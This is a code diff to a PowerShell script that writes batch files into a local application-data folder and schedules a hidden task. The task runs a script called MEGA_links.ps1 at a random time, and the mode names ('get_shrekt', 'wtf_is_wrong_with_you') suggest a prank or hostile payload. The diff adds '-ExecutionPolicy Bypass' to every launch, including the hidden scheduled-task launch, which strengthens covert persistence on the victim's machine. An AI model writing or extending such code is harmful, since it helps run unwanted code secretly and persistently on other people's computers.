@@ -100,9 +100,9 @@ if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shr
 @"
 @echo off
 
-Powershell "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "save_him_from_hell"
+Powershell -ExecutionPolicy Bypass -File "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "save_him_from_hell"
 
-Powershell "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "get_shrekt"
+Powershell -ExecutionPolicy Bypass -File "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "get_shrekt"
 
 "@ | Out-File "$env:LOCALAPPDATA\Data\run.bat" -Encoding ASCII
 
@@ -114,7 +114,7 @@ Powershell "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "get_shrekt"
 @"
 @echo off
 
-Powershell "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "save_him_from_hell"
+Powershell -ExecutionPolicy Bypass -File "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "save_him_from_hell"
 
 "$env:LOCALAPPDATA\Data\image.png"
 
@@ -128,9 +128,9 @@ Powershell "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "save_him_from_hell"
 @"
 @echo off
 
-Powershell "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "ah_shit..._here_we_go_again"
+Powershell -ExecutionPolicy Bypass -File "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "ah_shit..._here_we_go_again"
 
-Powershell "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "get_shrekt"
+Powershell -ExecutionPolicy Bypass -File "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "get_shrekt"
 
 "@ | Out-File "$env:LOCALAPPDATA\Data\run.bat" -Encoding ASCII
 
@@ -284,7 +284,7 @@ Powershell "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "get_shrekt"
     # Set the action of the task
     $action = New-ScheduledTaskAction `
         -Execute "powershell.exe" `
-        -Argument "-NoProfile -WindowStyle Hidden -File `"$env:LOCALAPPDATA\Data\MEGA_links.ps1`" `"wtf_is_wrong_with_you`""
+        -Argument "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$env:LOCALAPPDATA\Data\MEGA_links.ps1`" `"wtf_is_wrong_with_you`""
 
     # Set the date/time execution of the task
     $trigger = New-ScheduledTaskTrigger -Once -At $randomDateTime
